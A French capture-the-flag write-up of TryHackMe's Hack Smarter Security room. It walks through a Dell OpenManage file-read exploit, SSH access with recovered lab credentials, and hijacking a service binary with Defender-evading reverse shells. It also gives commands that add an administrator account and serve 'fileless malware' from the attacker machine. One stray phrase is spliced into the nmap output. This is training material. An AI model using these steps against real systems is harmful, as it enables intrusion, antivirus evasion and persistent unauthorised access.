---
date: 2024-03-22T16:28:33-05:00
# description: ""
image: "/images/THM-HackSmarterSecurity/hack-smarter.png"
showTableOfContents: true
tags: ["TryHackMe"]
categories: ["Writeups"]
title: "THM: Hack Smarter Security"
type: "post"
---

* Platforme: TryHackMe
* Lien: [Hack Smarter Security](https://tryhackme.com/r/room/hacksmartersecurity)
* Niveau: Moyen
* OS: Windows
---

Dans Hack Smarter Security, nous devons exploiter un serveur Windows utilisant quelques services (dont SSH). Après avoir exploité un service peu courant pour accéder au système, nous devons contourner Microsoft Defender afin de prendre le contrôle d'un compte privilégié. 

L'adresse IP cible est `10.10.189.226`.

## Reconnaissance

```
nmap -sC -sV -oA nmap/Hack-Smarter-Security 10.10.189.226
```

Plusieurs ports sont ouverts :
* FTP sur le port 21, avec une connexion anonyme autorisée
* SSH sur le port 22, qui peut potentiellement être notre point d'accès au système si des identifiants sont trouvés
* Un serveur Windows IIS sur le port 80
* Les résultats du scan ne nous permettent pas de déterminer avec certitude quel service est sur le port 1311
* Le serveur Windows WBT fonctionne sur le port 3389, il est utilisé pour les connexions de Windows Remote Desktop et de Remote Assistance

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-18 18:27 CDT
Nmap scan report for 10.10.160.34
Host is up (0.24s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 06-28-23  02:58PM                 3722 Credit-Cards-We-Pwned.txt
|_06-28-23  03:00PM              1022126 stolen-passport.png
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 0d:fa:da:de:c9:dd:99:8d:2e:8e:eb:3b:93:ff:e2:6c (RSA)
|   256 5d:0c:df:32:26:d3:71:a2:8e:6e:9a:1c:43:fc:1a:03 (ECDSA)
|_  256 c4:25:e7:09:d6:c9:d9:86:5f:6e:8a:8b:ec:13:4a:8b (ED25519)
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: HackSmarterSec
1311/tcp open  ssl/rxmon?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Strict-Transport-Security: max-age=0
|     X-Frame-Options: SAMEORIGIN
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     vary: accept-encoding
|     Content-Type: text/html;charset=UTF-8
|     Date: Mon, 18 Mar 2024 23:28:22 GMT
|     Connection: close
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
|     <html>
|     <head>
|     <META http-equiv="Content-Type" content="text/html; charset=UTF-8">
|     <title>OpenManage&trade;</title>
|     <link type="text/css" rel="stylesheet" href="/oma/css/loginmaster.css">
|     <style type="text/css"></style>
|     <script type="text/javascript" src="/oma/js/prototype.js" language="javascript"></script><script type="text/javascript" src="/oma/js/gnavbar.js" language="javascript"></script><script type="text/javascript" src="/oma/js/Clarity.js" language="javascript"></script><script language="javascript">
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Strict-Transport-Security: max-age=0
|     X-Frame-Options: SAMEORIGIN
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     vary: accept-encoding
|     Content-Type: text/html;charset=UTF-8
|     Date: Mon, 18 Mar 2024 23:28:29 GMT
|     Connection: close
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
|     <html>
|     <head>
|     <META http-equiv="Content-Type" content="text/html; charset=UTF-8">
|     <title>OpenManage&trade;</title>
|     <link type="text/css" rel="stylesheet" href="/oma/css/loginmaster.css">
|     <style type="text/css"></style>
|_    <script type="text/javascript" src="/oma/js/prototype.js" language="javascript"></script><script type="text/javascript" src="/oma/js/gnavbar.js" language="javascript"></script><script type="text/javascript" src="/oma/js/Clarity.js" language="javascript"></script><script language="javascript">
| ssl-cert: Subject: commonName=hacksmartersec/organizationName=Dell Inc/stateOrProvinceName=TX/countryName=US
| Not valid before: 2023-06-30T19:03:17
|_Not valid after:  2025-06-29T19:03:17
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-03-18T23:29:06+00:00; +2s from scanner time.
| ssl-cert: Subject: commonName=hacksmartersec
| Not valid before: 2024-03-17T23:23:26
|_Not valid after:  2024-09-16T23:23:26
| rdp-ntlm-info: 
|   Target_Name: HACKSMARTERSEC
|   NetBIOS_Domain_Name: HACKSMARTERSEC
|   NetBIOS_Computer_Name: HACKSMARTERSEC
|   DNS_Domain_Name: hacksmartersec
|   DNS_Computer_Name: hacksmartersec
|   Product_Version: 10.0.17763
|_  System_Time: 2024-03-18T23:29:00+00:00
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1311-TCP:V=7.94SVN%T=SSL%I=7%D=3/18%Time=65F8CE13%P=x86_64-pc-linux
SF:-gnu%r(GetRequest,1089,"HTTP/1\.1\x20200\x20\r\nStrict-Transport-Securi
SF:ty:\x20max-age=0\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-Content-Type-Op
SF:tions:\x20nosniff\r\nX-XSS-Protection:\x201;\x20mode=block\r\nvary:\x20
SF:accept-encoding\r\nContent-Type:\x20text/html;charset=UTF-8\r\nDate:\x2
SF:0Mon,\x2018\x20Mar\x202024\x2023:28:22\x20GMT\r\nConnection:\x20close\r
SF:\n\r\n<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\.0\x20
SF:Strict//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-strict\.dtd\
SF:">\r\n<html>\r\n<head>\r\n<META\x20http-equiv=\"Content-Type\"\x20conte
SF:nt=\"text/html;\x20charset=UTF-8\">\r\n<title>OpenManage&trade;</title>
SF:\r\n<link\x20type=\"text/css\"\x20rel=\"stylesheet\"\x20href=\"/oma/css
SF:/loginmaster\.css\">\r\n<style\x20type=\"text/css\"></style>\r\n<script
SF:\x20type=\"text/javascript\"\x20src=\"/oma/js/prototype\.js\"\x20langua
SF:ge=\"javascript\"></script><script\x20type=\"text/javascript\"\x20src=\
SF:"/oma/js/gnavbar\.js\"\x20language=\"javascript\"></script><script\x20t
SF:ype=\"text/javascript\"\x20src=\"/oma/js/Clarity\.js\"\x20language=\"ja
SF:vascript\"></script><script\x20language=\"javascript\">\r\n\x20")%r(HTT
SF:POptions,1089,"HTTP/1\.1\x20200\x20\r\nStrict-Transport-Security:\x20ma
SF:x-age=0\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-Content-Type-Options:\x2
SF:0nosniff\r\nX-XSS-Protection:\x201;\x20mode=block\r\nvary:\x20accept-en
SF:coding\r\nContent-Type:\x20text/html;charset=UTF-8\r\nDate:\x20Mon,\x20
SF:18\x20Mar\x202024\x2023:28:29\x20GMT\Using fileless malwarer\nConnection:\x20close\r\n\r\n<!D
SF:OCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\.0\x20Strict//E
SF:N\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-strict\.dtd\">\r\n<ht
SF:ml>\r\n<head>\r\n<META\x20http-equiv=\"Content-Type\"\x20content=\"text
SF:/html;\x20charset=UTF-8\">\r\n<title>OpenManage&trade;</title>\r\n<link
SF:\x20type=\"text/css\"\x20rel=\"stylesheet\"\x20href=\"/oma/css/loginmas
SF:ter\.css\">\r\n<style\x20type=\"text/css\"></style>\r\n<script\x20type=
SF:\"text/javascript\"\x20src=\"/oma/js/prototype\.js\"\x20language=\"java
SF:script\"></script><script\x20type=\"text/javascript\"\x20src=\"/oma/js/
SF:gnavbar\.js\"\x20language=\"javascript\"></script><script\x20type=\"tex
SF:t/javascript\"\x20src=\"/oma/js/Clarity\.js\"\x20language=\"javascript\
SF:"></script><script\x20language=\"javascript\">\r\n\x20");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2s, deviation: 0s, median: 1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 80.56 seconds
```

## Enumération

Le scan nmap révèle que le serveur FTP permet une connexion anonyme. Après avoir accédé au serveur, nous trouvons deux fichiers `Credit-Cards-We-Pwned.txt` et `stolen-passport.png`.

![FTP files](/images/THM-HackSmarterSecurity/ftp-server.png)

Le fichier `Credit-Cards-We-Pwned.txt` contient une liste d'informations de cartes de crédit, qui sont certainement fausses puisqu'il s'agit d'un hacking challenge.

![Fake credit cards numbers](/images/THM-HackSmarterSecurity/fake-credit-cards.png)

Le transfert du fichier `stolen-passport.png` échoue à cause du mode ASCII activé sur le serveur FTP, les images sont souvent stockées en format binaire. 

![Password image transfer fails](/images/THM-HackSmarterSecurity/passport-img.png)

Après être passé en mode binaire avec `binary`, le transfert réussit.

![Password image transfer success](/images/THM-HackSmarterSecurity/passport-img2.png)

Rien d'intéressant n'est obtenu après avoir utilisé `strings` et `exiftool` sur le fichier. Cette piste finit par être un cul de sac qui ne mène à rien d'exploitable.

![Picture of the eye of the room author](/images/THM-HackSmarterSecurity/passport-img3.png)

Après avoir visité le site web, rien de particulier n'est trouvé, il s'agit d'un simple site web statique sans aucune fonctionnalité.

![Hackers website](/images/THM-HackSmarterSecurity/hackers-website.png)

L'énumération des répertoires et sous-domaines avec `gobuster` est également infructueuse.

Accéder au service sur le port `1311` avec `http://10.10.189.226:1311/` produit une erreur.

![port 1311 error](/images/THM-HackSmarterSecurity/port1311-error.png)

Ce problème peut être résolu en utilisant `https` dans ce cas. Nous obtenons une page de login `Dell EMC OpenManage`.

![Dell OpenManage service](/images/THM-HackSmarterSecurity/dell-openmanage.png)

Essayer de contourner la page de connexion via l'exploit trouvé dans ce [Tenable blog post](https://www.tenable.com/security/research/tra-2021-07) est un échec.

En allant dans la section `About`, nous découvrons que le logiciel fonctionne avec la version `9.4.0.2`.

![Dell OMACS version](/images/THM-HackSmarterSecurity/Dell-OMACS-version.png)

En recherchant des vulnérabilités, nous trouvons [CVE-2020-5377](https://rhinosecuritylabs.com/research/cve-2020-5377-dell-openmanage-server-administrator-file-read/), il s'agit d'une vulnérabilité de lecture de fichier dans `Dell OpenManage Server Administrator` et un PoC est trouvé [ici](https://github.com/RhinoSecurityLabs/CVEs/tree/master/CVE-2020-5377_CVE-2021-21514). 

En suivant les instructions d'utilisation, nous tentons d'exploiter le system cible.

```
python3 Dell-xploit.py 10.2.104.130 10.10.189.226:1311
```
![Dell file read exploit](/images/THM-HackSmarterSecurity/Dell-exploit.png)

Nous pouvons lire les fichiers sur le serveur. Le scan nmap nous apprend que la cible utilise `Microsoft IIS` sur le port 80
* Le dossier racine d'IIS est situé à `C:\inetpub\wwwroot`
* Nous trouvons `commonName=hacksmartersec` dans la section du port 1311
* Nous savons que le fichier `web.config` doit être présent à la racine du contenu de l'application déployée. Vous pouvez en savoir plus à ce sujet [ici](https://learn.microsoft.com/en-us/aspnet/core/host-and-deploy/iis/web-config?view=aspnetcore-8.0)

En appliquant toutes les informations dont nous disposons, les identifiants de l'utilisateur `tyler` sont trouvés dans `C:inetpub\wwwroot\hacksmartersec\web.config`.

![Tyler SSH credentials found](/images/THM-HackSmarterSecurity/creds.png)

## Foothold

En utilisant `tyler:IAmA1337h4x0randIkn0wit!` nous arrivons à nous connecter via SSH.

![SSH access with user tyler credentials](/images/THM-HackSmarterSecurity/ssh-access.png)

### What is user.txt? 

Le fichier `user.txt` est alors accessible à l'adresse `C:\Users\tyler\Desktop\user.txt`.

![User flag](/images/THM-HackSmarterSecurity/user-flag.png)

## Escalade de privilèges

### Création d'un nouveau compte administrateur

Nous devons maintenant trouver des pistes d'escalade de privilèges. La tentative d'utilisation de `winPEAS` pour l'énumération du système échoue, le fichier est signalé et arrêté par Microsoft Defender.

![winPEAS fails because of Windows Defender](/images/THM-HackSmarterSecurity/winpeas-fail.png)

[PrivescCheck](https://github.com/itm4n/PrivescCheck/tree/master) par contre fonctionne sans être stoppé par Defender.

![PrivescCheck works despite Microsoft Defender](/images/THM-HackSmarterSecurity/privesccheck.png)

Quelques services différents de ceux proposés par défaut sont trouvés.

![A few non-default services are discovered](/images/THM-HackSmarterSecurity/non-default-services.png)

Dans la section `Services binary permissions` nous trouvons un service vulnérable appelé `spoofer-scheduler`. Il est potentiellement possible de remplacer `spoofer-scheduler.exe` par un fichier malveillant du même nom afin d'élever nos privilèges puisque l'utilisateur `tyler` dispose de toutes les permissions nécessaires.

![Vulnerable service found](/images/THM-HackSmarterSecurity/vulnerable-service.png)

Nous devons tenir compte du fait que Windows Defender est actif, si le reverse shell n'est pas assez furtif, il sera repéré. Nous disposons de plusieurs moyens pour atteindre notre objectif.

Un reverse shell écrit en Nim qui échappe à Windows Defender est disponible [ici](https://github.com/Sn1r/Nim-Reverse-Shell).

Nous arrêtons le service avec `Stop-Service -Name "spoofer-scheduler"` et nous supprimons le fichier exécutable avec `rm spoofer-scheduler.exe`.

> N'oubliez pas de compiler le reverse shell avec `nim c -d:mingw --app:gui rev_shell.nim`.

Le reverse shell est transféré à la cible après la compilation.

![Malicious executable file on the target](/images/THM-HackSmarterSecurity/malicious-exe.png)

Après le redémarrage du service avec `Start-Service -Name "spoofer-scheduler"` nous obtenons un reverse shell avec un compte privilégié.

![Privileged shell obtained](/images/THM-HackSmarterSecurity/privileged-shell.png)

Mais le shell est instable et expire rapidement. Étant donné que le service ne démarre pas correctement (à cause du remplacement du fichier), Windows l'arrête prématurément.

![Service cannot be started and gets timed out](/images/THM-HackSmarterSecurity/service-error.png)

Pour établir la persistance, un nouvel utilisateur peut rapidement être créé et ajouté au groupe `administrators` pour obtenir les privilèges d'administrateur.

```
net user <username> <password> /add
net localgroup administrators <username> /add
```
![Persistence is achieved via the creation of a new privileged user](/images/THM-HackSmarterSecurity/persistence-account.png)

Le compte nouvellement créé peut être utilisé pour accéder au système via SSH.

![Privileges of the newly created admin account](/images/THM-HackSmarterSecurity/persistence-account-privs.png)

#### Which organizations is the Hack Smarter group targeting next? 

Avec les privilèges d'administrateur, nous pouvons accéder à la liste des prochaines cibles à l'adresse `C:\Users\Administrator\Desktop\Hacking-Targets\hacking-targets.txt`.

![Hackers' targets list](/images/THM-HackSmarterSecurity/hacking-targets.png)

### Utilisation d'un fileless malware 

Une autre méthode pour échapper à Windows Defender consiste à utiliser [SecUp](https://github.com/daniellowrie/update_script). Il s'agit d'un "fileless malware" qui contourne Windows Defender en utilisant PowerShell et l'obscurcissement". Vous pouvez consulter la [vidéo YouTube](https://www.youtube.com/watch?v=LjoAV3O40og&ab_channel=DanielLowrie) pour obtenir des explications.

1. Cloner le répertoire 

```
git clone https://github.com/daniellowrie/update_script
```

2. Démarrer le programme. Il configure également un serveur HTTP pour transférer les fichiers malveillants.

```
go run SecUp.go 10.2.104.130
```

![go run command](/images/THM-HackSmarterSecurity/go-run.png)

3.  Mettre en place un listener sur le port 443

```
nc -lnvp 443
```

4. Le processus de compilation crée un fichier nommé `update_script.exe`

```
GOOS=windows go build update_script.go
```

![files compilation](/images/THM-HackSmarterSecurity/malware-exe.png)

5. Renommez le fichier malveillant `spoofer-scheduler.exe` pour qu'il fonctionne sur la cible.

```
mv update_script.exe spoofer-scheduler.exe
```

Sur la cible, arrêtez le service, remplacez le fichier légitime par votre fichier malveillant et redémarrez le service. Vous devriez voir les fichiers être transférés sur le serveur cible.

![Malware working successfully](/images/THM-HackSmarterSecurity/malware-success.png)

Sur le listener, nous obtenons un shell avec des privilèges d'administrateur qui n'expire pas.

![Stable shell that does not die received](/images/THM-HackSmarterSecurity/admin-shell.png)

J'espère que cet article vous a été utile et qu'il vous a permis d'apprendre de nouvelles choses. Il existe de nombreuses autres façons d'échapper aux antivirus/EDR, tel que [AMSI Bypass](https://www.hackingarticles.in/a-detailed-guide-on-amsi-bypass/), je vous encourage à apprendre et à pratiquer différentes méthodes. Si vous aimez les livres, je vous recommande vivement [Evading EDR: The Definitive Guide to Defeating Endpoint Detection Systems](https://www.amazon.com/Evading-EDR-Definitive-Defeating-Detection/dp/1718503342) et [Antivirus Bypass Techniques](https://www.amazon.com/Antivirus-Bypass-Techniques-practical-techniques/dp/1801079749).
